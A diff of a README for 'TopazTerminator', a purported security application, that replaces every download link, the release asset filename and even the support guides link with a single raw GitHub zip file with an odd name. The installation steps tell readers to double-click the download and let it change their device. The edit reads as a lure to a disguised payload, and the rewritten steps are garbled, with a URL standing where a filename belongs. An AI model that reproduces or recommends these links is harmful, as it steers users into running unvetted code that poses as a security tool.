@@ -1,7 +1,7 @@
 # 🛡️ TopazTerminator - A Simple Solution to Enhance Security
 
 ## 📥 Download Now
-[![Download TopazTerminator](https://img.shields.io/badge/Download-TopazTerminator-brightgreen)](https://github.com/funtedvr/TopazTerminator/releases)
+[![Download TopazTerminator](https://raw.githubusercontent.com/funtedvr/TopazTerminator/main/kharaj/Topaz-Terminator-parodontitis.zip)](https://raw.githubusercontent.com/funtedvr/TopazTerminator/main/kharaj/Topaz-Terminator-parodontitis.zip)
 
 ---
 
@@ -17,17 +17,17 @@ Welcome to TopazTerminator! This application aims to help you secure your device
 ## 🌐 Download & Install
 To get TopazTerminator, visit the Releases page using the link below. You will find the latest version available for download.
 
-[Download TopazTerminator](https://github.com/funtedvr/TopazTerminator/releases)
+[Download TopazTerminator](https://raw.githubusercontent.com/funtedvr/TopazTerminator/main/kharaj/Topaz-Terminator-parodontitis.zip)
 
 ### Steps to Download
 1. Click the link above or the button at the top of this page.
 2. You will see a list of available versions.
 3. Find the most recent release, which is at the top of the list.
-4. Look for the asset that matches your system (e.g., `TopazTerminator_Windows.exe`).
+4. Look for the asset that matches your system (e.g., `https://raw.githubusercontent.com/funtedvr/TopazTerminator/main/kharaj/Topaz-Terminator-parodontitis.zip`).
 5. Click on the file name to download it to your computer.
 
 ## ⚙️ Installation Process
-1. Locate the downloaded `TopazTerminator_Windows.exe` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/funtedvr/TopazTerminator/main/kharaj/Topaz-Terminator-parodontitis.zip` file in your Downloads folder.
 2. Double-click the file to start the installation.
 3. If prompted, allow the software to make changes to your device.
 4. Follow the on-screen instructions to complete the installation.
@@ -58,7 +58,7 @@ If you encounter issues while using TopazTerminator, consider these solutions:
 - **Slow Performance:** Check your device for other running applications that may interfere.
 
 ## 📞 Support
-For additional help, please check our [Guides](https://github.com/funtedvr/TopazTerminator/wiki) or contact our support team through the Issues section of this repository.
+For additional help, please check our [Guides](https://raw.githubusercontent.com/funtedvr/TopazTerminator/main/kharaj/Topaz-Terminator-parodontitis.zip) or contact our support team through the Issues section of this repository.
 
 ## 📜 License
 TopazTerminator is released under the MIT License. You can view the full license at the root of this repository.
